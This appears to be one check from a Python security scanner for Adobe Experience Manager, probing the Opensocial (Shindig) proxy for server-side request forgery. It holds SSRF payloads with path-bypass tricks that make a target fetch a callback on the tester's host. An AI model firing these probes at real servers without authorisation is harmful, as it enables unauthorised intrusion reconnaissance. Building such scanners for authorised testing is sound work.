import concurrent.futures
import itertools
import json
import datetime
import traceback
import sys
import argparse
import base64
import time
from collections import namedtuple
from http.server import BaseHTTPRequestHandler, HTTPServer
from random import choice, randint
from string import ascii_letters
from threading import Thread
import requests


@register('opensocial_proxy')
def ssrf_opensocial_proxy(base_url, my_host, debug=False, proxy=None):
    global token, d
    results = []
    OPENSOCIAL1 = itertools.product(('/libs/opensocial/proxy{0}?container=default&url={{0}}', '///libs///opensocial///proxy{0}?container=default&url={{0}}'), ('', '.json', '.1.json', '.4.2.1...json', '.html'))
    OPENSOCIAL1 = list((pair[0].format(pair[1]) for pair in OPENSOCIAL1))
    OPENSOCIAL2 = itertools.product(('/libs/opensocial/proxy{0}?container=default&url={{0}}', '///libs///opensocial///proxy{0}?container=default&url={{0}}'), ('/{0}.1.json', '/{0}.4.2.1...json', '/{0}.css', '/{0}.js', '/{0}.png', '/{0}.bmp', ';%0a{0}.css', ';%0a{0}.js', ';%0a{0}.png', ';%0a{0}.html', ';%0a{0}.ico', ';%0a{0}.png', '/{0}.ico', './{0}.html'))
    cache_buster = random_string()
    OPENSOCIAL2 = list((pair[0].format(pair[1].format(cache_buster)) for pair in OPENSOCIAL2))
    OPENSOCIAL3 = itertools.product(('/libs/opensocial/proxy{0}?container=default&url={{0}}', '///libs///opensocial///proxy{0}?container=default&url={{0}}'), ('.{0}.css', '.{0}.js', '.{0}.png', '.{0}.ico', '.{0}.bmp', '.{0}.gif', '.{0}.html'))
    cache_buster = randint(1, (2 ** 12))
    OPENSOCIAL3 = list((pair[0].format(pair[1].format(cache_buster)) for pair in OPENSOCIAL3))
    for path in itertools.chain(OPENSOCIAL1, OPENSOCIAL2, OPENSOCIAL3):
        url = normalize_url(base_url, path)
        encoded_orig_url = base64.b16encode(url.encode()).decode()
        back_url = 'http://{0}/{1}/opensocial/{2}/'.format(my_host, token, encoded_orig_url)
        url = url.format(back_url)
        try:
            http_request(url, proxy=proxy, debug=debug)
        except:
            if debug:
                error('Exception while performing a check', check='ssrf_opensocial_proxy', url=url)
    time.sleep(10)
    if ('opensocial' in d):
        u = base64.b16decode(d.get('opensocial')[0]).decode()
        f = Finding('Opensocial (shindig) proxy', u, 'SSRF via Opensocial (shindig) proxy. See - https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=41')
        results.append(f)
    return results
